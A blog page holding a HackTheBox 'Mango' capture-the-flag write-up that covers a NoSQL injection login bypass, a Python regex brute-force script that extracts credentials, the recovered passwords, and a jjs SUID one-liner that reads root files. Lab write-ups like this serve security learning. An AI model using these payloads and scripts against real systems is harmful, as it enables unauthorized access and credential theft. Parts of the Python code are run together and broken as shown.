<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HackTheBox Mango Write Up - AJDIN</title><link rel="icon" type="image/png" href=icons/myicon.png /><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta property="og:title" content="HackTheBox Mango Write Up" />
<meta property="og:description" content="This is a write up on how to gain root on HackTheBox Mango" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://example.org/posts/htb/mango/" />
<meta property="article:published_time" content="2020-04-18T13:28:11+02:00" />
<meta property="article:modified_time" content="2020-04-18T13:28:11+02:00" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="HackTheBox Mango Write Up"/>
<meta name="twitter:description" content="This is a write up on how to gain root on HackTheBox Mango"/>
<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:200,300" rel="stylesheet">

	<link rel="stylesheet" type="text/css" media="screen" href="http://example.org/css/normalize.css" />
	<link rel="stylesheet" type="text/css" media="screen" href="http://example.org/css/main.css" />
	<link rel="stylesheet" type="text/css" href="http://example.org/css/custom.css" />
	<link rel="stylesheet" type="text/css" href="http://example.org/css/dark.css"  />
	<link rel="stylesheet" type="text/css" href="http://example.org/css/custom-dark.css"  />

	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
	<script src="http://example.org/js/main.js"></script>
	<script src="http://example.org/js/abc.js"></script>
	<script src="http://example.org/js/xyz.js"></script>
	<script src="https://code.jquery.com/jquery-3.4.1.js"></script>
</head>

<body>
	<div class="container wrapper post">
		<div class="header">
	<base href="http://example.org/">
	<h1 class="site-title"><a href="http://example.org/">AJDIN</a></h1>
	<div class="site-description"><h2>welcome to ajdin.io</h2><nav class="nav social">
			<ul class="flat"><a href="https://github.com/ajdintrejic" title="Github"><i data-feather="github"></i></a><a href="https://twitter.com/ajdintrejic" title="Twitter"><i data-feather="twitter"></i></a><a href="mailto:ajdintrejic@protonmail.ch" title="Mail"><i data-feather="mail"></i></a><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></ul>
		</nav>
	</div>

	<nav class="nav">
		<ul class="flat">
			
			<li>
				<a href="/">Home</a>
			</li>
			
			<li>
				<a href="/posts">Archive</a>
			</li>
			
			<li>
				<a href="/about">About</a>
			</li>
			
			<li>
				<a href="/categories">Categories</a>
			</li>
			
			<li>
				<a href="/tags">Tags</a>
			</li>
			
		</ul>
	</nav>
</div>


		<div class="post-header">
			<h1 class="title">HackTheBox Mango Write Up</h1>
			<div class="meta">Posted at &mdash; Apr 18, 2020</div>
		</div>

		<div class="markdown">
            
<h2 id="reconnaissance">Reconnaissance<a class="anchor" href="#reconnaissance">#</a></h2>
<p>Let’s run nmap,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162
</code></pre></div><p><img src="/htb/mango/nmap_initial_results.png" alt="nmap"></p>
<p>We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.</p>
<p><img src="/htb/mango/mango_search_page.png" alt="page"></p>
<p><img src="/htb/mango/mango_analytics_page.png" alt="page"></p>
<h2 id="getting-user-account">Getting user account<a class="anchor" href="#getting-user-account">#</a></h2>
<p>I checked the /robots.txt, also ran gobuster, nothing useful there. The SSL certificate wasn’t valid so I took a look a there and we have a page reference:
staging-order.mango.htb</p>
<p><img src="/htb/mango/ssl_certificate.png" alt="ssl"></p>
<p>The page is inaccessible, but we can use the /etc/hosts file to redirect the page back to the server itself. You could also change the headers of the https request and change the host value to “staging-order.mango.htb”.</p>
<p>We have multiple server running on the same machine and port (Vhost - virtual hosts) so that is why when we change the host value, we access a “different” server.</p>
<p>Now I added the line to /etc/hosts so the hostname is translated to the correct IP address.</p>
<p><img src="/htb/mango/etc_hosts.png" alt="hosts"></p>
<h3 id="nosql-injection">NoSQL injection<a class="anchor" href="#nosql-injection">#</a></h3>
<p>Now we have a login page here, I spent around 4 hours here as this wasn’t something I had experience with. We have to perform an authentication bypass.</p>
<p><img src="/htb/mango/login_mongodb.png" alt="login"></p>
<p>The login is handeld by MongoDB in the background. How do I know this? The full nmap scan has recognized a MongoDB instance. MondoDB is a NoSQL database, unlike PostgreSQL, which is an SQL database. We need to perform a NoSQL injection attack.</p>
<p>I opened the network tab in Firefox and tried to login with “admin” and “test”. This will send a POST request. We can open it and see the request body.</p>
<p><img src="/htb/mango/network_tab.png" alt="network"></p>
<p><img src="/htb/mango/request.png" alt="request"></p>
<p>Edit the request:</p>
<p>Before:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">username=admin&amp;password=test&amp;login=login
</code></pre></div><p>After:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">username=admin&amp;password[$ne]=test&amp;login=login
</code></pre></div><p>This will trick Mongo to check if the password doesn’t match and if it doesn’t it will let me in.</p>
<p><img src="/htb/mango/request_reply.png" alt="reply"></p>
<p><img src="/htb/mango/after_login.png" alt="afterlogin"></p>
<h3 id="bruteforcing-the-password">Bruteforcing the password<a class="anchor" href="#bruteforcing-the-password">#</a></h3>
<p>We can’t do anything from the webpage so I tried to brute-force the password. <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#brute-force-login-usernames-and-passwords-from-post-login">Here</a> I have found a nice script. It uses regular expressions to try to match the password. The code is fairly simple so I won’t be explaining that.</p>
<p>You should change the cookie ID.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> stringurl <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://example.com&#34;</span>
headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;Host&#34;</span>: <span style="color:#e6db74">&#34;exmaple.com&#34;</span>}
cookies <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;PHPSESSID&#34;</span>: <span style="color:#e6db74">&#34;s3gcsgtqre05bah2vt6tibq8lsdfk&#34;</span>}
possible_chars <span style="color:#f92672">=</span> list(string<span style="color:#f92672">.</span>ascii_letters) <span style="color:#f92672">+</span> list(string<span style="color:#f92672">.</span>digits) <span style="color:#f92672">+</span> [<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span>c <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>punctuation<span style="color:#f92672">+</span>string<span style="color:#f92672">.</span>whitespace ]<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_password</span>(username):
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Extracting password of &#34;</span><span style="color:#f92672">+</span>username)
    params <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>:username, <span style="color:#e6db74">&#34;password[$regex]&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;login&#34;</span>: <span style="color:#e6db74">&#34;login&#34;</span>}
    password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;^&#34;</span>
    <span style="color:#66d9ef">while</span> True:
        <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> possible_chars:
            params[<span style="color:#e6db74">&#34;password[$regex]&#34;</span>] <span style="color:#f92672">=</span> password <span style="color:#f92672">+</span> c <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.*&#34;</span>
            pr <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>params, headers<span style="color:#f92672">=</span>headers, cookies<span style="color:#f92672">=</span>cookies, verify<span style="color:#f92672">=</span>False, allow_redirects<span style="color:#f92672">=</span>False)
            <span style="color:#66d9ef">if</span> int(pr<span style="color:#f92672">.</span>status_code) <span style="color:#f92672">==</span> <span style="color:#ae81ff">302</span>:
                password <span style="color:#f92672">+=</span> c
                <span style="color:#66d9ef">break</span>
        <span style="color:#66d9ef">if</span> c <span style="color:#f92672">==</span> possible_chars[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Found password &#34;</span><span style="color:#f92672">+</span>password[<span style="color:#ae81ff">1</span>:]<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34; for username &#34;</span><span style="color:#f92672">+</span>username)
            <span style="color:#66d9ef">return</span> password[<span style="color:#ae81ff">1</span>:]<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_usernames</span>():
    usernames <span style="color:#f92672">=</span> []
    params <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username[$regex]&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;password[$regex]&#34;</span>:<span style="color:#e6db74">&#34;.*&#34;</span>, <span style="color:#e6db74">&#34;login&#34;</span>: <span style="color:#e6db74">&#34;login&#34;</span>}
    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> possible_chars:
        username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;^&#34;</span> <span style="color:#f92672">+</span> c
        params[<span style="color:#e6db74">&#34;username[$regex]&#34;</span>] <span style="color:#f92672">=</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.*&#34;</span>
        pr <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>params, headers<span style="color:#f92672">=</span>headers, cookies<span style="color:#f92672">=</span>cookies, verify<span style="color:#f92672">=</span>False, allow_redirects<span style="color:#f92672">=</span>False)
        <span style="color:#66d9ef">if</span> int(pr<span style="color:#f92672">.</span>status_code) <span style="color:#f92672">==</span> <span style="color:#ae81ff">302</span>:
            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Found username starting with &#34;</span><span style="color:#f92672">+</span>c)
            <span style="color:#66d9ef">while</span> True:
                <span style="color:#66d9ef">for</span> c2 <span style="color:#f92672">in</span> possible_chars:
                    params[<span style="color:#e6db74">&#34;username[$regex]&#34;</span>] <span style="color:#f92672">=</span> username <span style="color:#f92672">+</span> c2 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.*&#34;</span>
                    <span style="color:#66d9ef">if</span> int(requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>params, headers<span style="color:#f92672">=</span>headers, cookies<span style="color:#f92672">=</span>cookies, verify<span style="color:#f92672">=</span>False, allow_redirects<span style="color:#f92672">=</span>False)<span style="color:#f92672">.</span>status_code) <span style="color:#f92672">==</span> <span style="color:#ae81ff">302</span>:
                        username <span style="color:#f92672">+=</span> c2
                        <span style="color:#66d9ef">print</span>(username)
                        breakif c2 <span style="color:#f92672">==</span> possible_chars[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
                    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Found username: &#34;</span><span style="color:#f92672">+</span>username[<span style="color:#ae81ff">1</span>:])
                    usernames<span style="color:#f92672">.</span>append(username[<span style="color:#ae81ff">1</span>:])
                    <span style="color:#66d9ef">break</span>
    <span style="color:#66d9ef">return</span> usernamesfor u <span style="color:#f92672">in</span> get_usernames():
    get_password(u)
</code></pre></div><p>This will run for some time, the output is:</p>
<p><img src="/htb/mango/password_bruteforce.png" alt="success"></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">admin:t9KcS3&gt;!0B#2
mango:h3mXK8RhU~f{]f5H
</code></pre></div><p>I couldn&rsquo;t SSH into admin but I could SSH into mango, switch user to admin and cat user.txt.</p>
<p><img src="/htb/mango/user_txt.png" alt="usertxt"></p>
<h2 id="getting-root-account">Getting root account<a class="anchor" href="#getting-root-account">#</a></h2>
<p>First, I switch from sh to bash by running /bin/bash.</p>
<p>I transfered linenum.sh on the server and checked the output. There was an interesting file with SUID bit set to 1:</p>
<p><img src="/htb/mango/jjs.png" alt="jjs"></p>
<h3 id="privilege-escalation-with-jjs">Privilege escalation with JJS<a class="anchor" href="#privilege-escalation-with-jjs">#</a></h3>
<p>This is usually used for privilege escalation, so when you run jjs you get some sort of shell, let’s check GTFOBin if we can escape. There is a file read exploit so I’ll use that (note: you have to change the file name and remove the “newline symbols” ):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">echo &#39;var BufferedReader = Java.type(&#34;java.io.BufferedReader&#34;); var FileReader = Java.type(&#34;java.io.FileReader&#34;); var br = new BufferedReader(new FileReader(&#34;/root/root.txt&#34;)); while ((line = br.readLine()) != null) { print(line); }&#39; | jjs
</code></pre></div><p><img src="/htb/mango/root_txt.png" alt="roottxt"></p>
<p>Thanks for reading! Make sure to follow me on Twitter @ajdintrejic.</p>


		</div>

		<div class="post-tags">
			
				
					<nav class="nav tags">
							<ul class="flat">
								
								<li><a href="/tags/authentication-bypass">Authentication bypass</a></li>
								
								<li><a href="/tags/mongodb">MongoDB</a></li>
								
								<li><a href="/tags/nosql-injection">NoSQL injection</a></li>
								
								<li><a href="/tags/jjs">jjs</a></li>
								
								<li><a href="/tags/ssl-certificate">SSL certificate</a></li>
								
							</ul>
					</nav>
				
			
		</div>
		</div>
	<div class="footer wrapper">
	<nav class="nav">
		<div> © All rights reserved |  <a href="https://twitter.com/ajdintrejic">Ajdin Trejić</a></div>
	</nav>
</div>



<script>feather.replace()</script>
</body>
</html>
